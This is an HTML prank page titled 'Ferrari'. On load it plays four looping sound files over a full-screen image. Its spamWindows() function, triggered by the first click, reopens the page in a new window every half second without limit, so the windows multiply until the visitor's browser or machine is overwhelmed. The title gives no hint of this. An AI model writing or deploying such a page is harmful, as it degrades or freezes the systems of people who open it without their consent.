<!DOCTYPE html>
<html>
<head>
    <title>Ferrari</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: #000; /* Fallback color if image fails to load */
            cursor: pointer;
        }
        
        body.loaded {
            background: url('herve.jpg') no-repeat center center fixed;
            background-size: cover;
        }
    </style>
    <script>
        let audio1, audio2, audio3, audio4;

        function initAudio() {
            try {
                audio1 = new Audio('sounds/herve.wav');
                audio2 = new Audio('sounds/herve1.wav');
                audio3 = new Audio('sounds/herve3.mp3');
                audio4 = new Audio('sounds/herve4.mp3');
                audio1.loop = true;
                audio2.loop = true;
                audio3.loop = true;
                audio4.loop = true;
            } catch(e) {
                console.error('Error loading audio:', e);
            }
        }

        function spamWindows() {
            setInterval(() => {
                window.open(window.location.href, '_blank');
            }, 500);
        }

        window.onload = function () {
            // Check if image loads
            let img = new Image();
            img.onload = function() {
                document.body.classList.add('loaded');
            };
            img.src = 'herve.jpg';

            initAudio();
            // Play all sounds on page load
            if(audio1) audio1.play();
            if(audio2) audio2.play();
            if(audio3) audio3.play();
            if(audio4) audio4.play();

            document.body.addEventListener('click', function () {
                if(audio1) audio1.play();
                if(audio2) audio2.play();
                if(audio3) audio3.play();
                if(audio4) audio4.play();
                spamWindows();
            });
        }
    </script>
</head>
<body>
</body>
</html>
